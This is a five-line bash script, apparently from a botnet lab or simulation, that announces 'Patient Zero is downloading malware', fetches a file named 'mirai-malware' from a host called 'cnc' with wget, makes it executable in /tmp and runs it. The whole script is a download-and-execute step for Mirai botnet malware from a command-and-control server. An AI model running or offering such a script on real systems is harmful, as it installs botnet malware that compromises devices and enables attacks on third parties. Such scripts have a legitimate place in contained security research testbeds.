#!/bin/bash
echo "Patient Zero is downloading malware..."
wget http://cnc:8080/mirai-malware -O /tmp/mirai
chmod +x /tmp/mirai
/tmp/mirai
